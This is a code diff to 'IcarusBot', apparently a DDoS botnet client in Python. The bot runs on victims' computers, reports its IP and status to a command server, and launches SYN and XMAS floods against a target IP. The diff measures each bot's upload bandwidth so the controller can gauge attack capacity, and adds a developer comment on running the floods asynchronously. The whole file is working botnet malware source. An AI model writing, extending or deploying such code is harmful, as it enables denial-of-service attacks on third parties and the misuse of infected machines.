@@ -5,9 +5,11 @@ import json
 import threading
 import time
 import getpass
+import math
 import os
 import sys
 import shutil
+import speedtest
 from enum import Enum
 from socket import timeout
 import syn_flood, xmas_attack, ping_flood, udp_flood, scan_flood, bandwidth_ddos
@@ -20,6 +22,9 @@ from config import API_URL
 BOT_ID_NAME = ''  # Replace this for each new bot handed out.
 NUM_PACKETS_TO_SEND = 1
 
+def truncate(n, decimals=0):
+    multiplier = 10 ** decimals
+    return int(n * multiplier) / multiplier
 
 class IcarusBot:
     """
@@ -41,6 +46,13 @@ class IcarusBot:
         BOT_ID_NAME = file.read()
         print(BOT_ID_NAME, "IS RUNNING")
 
+        print("GAUGING SPEED")
+        st = speedtest.Speedtest()
+        st.get_servers()
+        st.get_best_server()
+        st.upload()
+        self.uploadBandwidth = truncate(st.results.dict()["upload"] / 1024 / 1024, 2)
+        print("SPEED GAUGED:", self.uploadBandwidth)
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
         self.bot_id = BOT_ID_NAME  # should be random or grabbed somehow from victim computer
         self.ip = requests.get('https://api.ipify.org').content.decode('utf8')
@@ -112,6 +124,7 @@ class IcarusBot:
             'ip': self.ip,
             'status': self.status,
             'id': self.bot_id,
+            'uploadSpeed': self.uploadBandwidth,
             'runtime': self.attack_runtime,
             'target': self.target_ip
         }
@@ -140,6 +153,7 @@ class IcarusBot:
                         'status': self.status,
                         'id': self.bot_id,
                         'runtime': self.attack_runtime,
+                        'uploadSpeed': self.uploadBandwidth,
                         'target': self.target_ip,
                         'error': 'none',
                         'exceptionsThrown': self.exceptionsThrown
@@ -154,7 +168,13 @@ class IcarusBot:
                         if attack_type == 'SYN_FLOOD':
                             # attack_thread = threading.Thread(target=syn_flood.SYN_Flood,args=(target_ip, NUM_PACKETS_TO_SEND, [1]))
                             # attack_thread.start()
-                            # attack_thread.join()
+                            # attack_thread.join() <-- Angus: DO NOT USE THIS. IT WILL BLOCK THE MAIN THREAD UNTIL IT STOPS. WE WANT IT TO RUN ASYNCHRONOUSLY.
+                            #                                   even use multiprocessing like the following code example:
+                            #                                   import multiprocessing
+                            #                                   proc = multiprocessing.Process(target=your_proc_function, args=())
+                            #                                   proc.start()
+                            #                                   # Terminate the process
+                            #                                   proc.terminate()  # sends a SIGTERM
                             syn_flood.SYN_Flood(target_ip, NUM_PACKETS_TO_SEND, ports)
                         elif attack_type == 'XMAS_FLOOD':
                             xmas_attack.XMAS_Attack(target_ip, NUM_PACKETS_TO_SEND, ports)
@@ -176,6 +196,7 @@ class IcarusBot:
                             'status': self.status,
                             'id': self.bot_id,
                             'runtime': self.attack_runtime,
+                            'uploadSpeed': self.uploadBandwidth,
                             'target': self.target_ip,
                             'error': 'failed_starting_attack',
                             'exceptionsThrown': self.exceptionsThrown
